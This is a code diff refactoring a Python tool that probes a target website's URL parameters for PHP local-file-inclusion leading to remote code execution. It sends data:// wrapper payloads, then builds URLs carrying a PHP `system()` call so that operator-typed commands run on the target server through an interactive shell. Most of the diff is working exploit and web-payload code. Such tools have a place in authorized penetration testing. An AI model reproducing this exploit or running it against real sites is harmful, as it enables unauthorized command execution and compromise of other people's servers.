@@ -1,24 +1,18 @@
 import re
-import os
 import base64
-import urllib
 import random
 import string
-import requests
+import urllib
+import urllib.parse
 
 from rich.console import Console
-from prompt_toolkit import PromptSession
-from prompt_toolkit.formatted_text import HTML
-from prompt_toolkit.history import InMemoryHistory
-from urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+from core.base import BaseChecker
 
-class DataChecker:
+
+class DataChecker(BaseChecker):
     def __init__(self, url, silent=False):
-        self.console = Console()
-        self.url = self.ensure_correct_protocol(url)
-        self.silent = silent
+        super().__init__(url, silent)
         self.random_string = self._generate_random_string()
         self.random_string_base64 = base64.b64encode(self.random_string.encode()).decode()
         half = len(self.random_string_base64) // 2
@@ -28,19 +22,6 @@ class DataChecker:
             f'data://text/plain,<?php echo "{self.random_string_base64_first_half}" . "{self.random_string_base64_second_half}"; ?>',
         ]
 
-    def ensure_correct_protocol(self, url):
-        if not url.startswith(('http://', 'https://')):
-            try:
-                requests.get('https://' + url, timeout=3, verify=False)
-                return 'https://' + url
-            except requests.exceptions.RequestException:
-                try:
-                    requests.get('http://' + url, timeout=3, verify=False)
-                    return 'http://' + url
-                except requests.exceptions.RequestException:
-                    pass
-        return url
-    
     def _generate_random_string(self, length=10):
         return ''.join(random.choice(string.ascii_letters) for _ in range(length))
 
@@ -70,16 +51,9 @@ class DataChecker:
                 new_params[param_name] = payload
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                
-                try:
-                    response = requests.get(fuzzed_url, timeout=5, verify=False)
-                except requests.exceptions.ConnectionError:
-                    if not self.silent:
-                        self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    return False, None
-                except requests.exceptions.RequestException:
-                    if not self.silent:
-                        self.console.print("[bold red]Request Timeout Error (WAF or down host)...[/bold red]")
+
+                response = self._safe_get(fuzzed_url)
+                if response is None:
                     return False, None
                 if payload_regex.search(response.text):
                     if not self.silent:
@@ -87,7 +61,17 @@ class DataChecker:
                     return True, param_name
 
         return False, None
-    
+
+    def _build_shell_url(self, cmd, param_name):
+        shell_code = f"data://text/plain,<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
+        parsed_url = urllib.parse.urlparse(self.url)
+        params = urllib.parse.parse_qs(parsed_url.query)
+        new_params = params.copy()
+        new_params[param_name] = shell_code
+        new_query = urllib.parse.urlencode(new_params, doseq=True)
+        fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
+        return fuzzed_url, "GET", {}
+
     def run_shell(self, param_name):
         self.silent = True
         result, _ = self.data_check()
@@ -95,49 +79,8 @@ class DataChecker:
             self.console.print("[bold red]LFI2RCE not detected or not exploitable.[/bold red]")
             return
 
-        self.console.print("[bold yellow]Interactive shell is ready. Type your commands.[/bold yellow]")
-        
-            
-        session = PromptSession(history=InMemoryHistory())        
-        while True:
-            try:
-                cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
-                if "exit" in cmd:
-                    raise KeyboardInterrupt
-                elif not cmd:
-                    continue
-                elif "clear" in cmd:
-                    if os.name == 'posix':
-                        os.system('clear')
-                    elif os.name == 'nt':
-                        os.system('cls')
-                    continue
+        self._interactive_shell(param_name, self._build_shell_url)
 
-                shell_code = f"data://text/plain,<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
-                parsed_url = urllib.parse.urlparse(self.url)
-                params = urllib.parse.parse_qs(parsed_url.query)
-                new_params = params.copy()
-                new_params[param_name] = shell_code
-                new_query = urllib.parse.urlencode(new_params, doseq=True)
-                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                
-                try:
-                    response = requests.get(fuzzed_url, verify=False)
-                except requests.exceptions.ConnectionError:
-                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    continue
-
-                pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
-                response_content = pattern.search(response.text)
-                if response_content and response_content.group(1):
-                    shell_output = response_content.group(1)
-                    self.console.print(f"[bold green]{shell_output}[/bold green]")
-                else:
-                    self.console.print("[bold red]No shell output.[/bold red]")
-                    
-            except KeyboardInterrupt:
-                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
-                    break        
 
 def main():
     url = input('Enter site URL to test: ')
@@ -148,5 +91,4 @@ def main():
         checker.run_shell(param_name)
 
 if __name__ == '__main__':
-    main() 
-
+    main()
